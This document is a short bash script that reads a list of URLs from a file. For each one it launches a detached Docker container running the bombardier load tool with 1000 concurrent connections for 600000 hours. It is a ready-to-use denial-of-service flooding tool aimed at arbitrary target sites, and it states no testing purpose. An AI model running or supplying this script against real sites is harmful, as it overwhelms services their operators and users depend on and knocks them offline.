#!/bin/bash

IFS=$'\n' read -d "" -r -a lines < "$1.txt"

for i in "${lines[@]}"
do
    URL="$i"
    echo "docker run -d --rm alpine/bombardier -c 1000 -d 600000h -l $URL"
    sudo docker run -d --rm alpine/bombardier -c 1000 -d 600000h -l "$URL"
done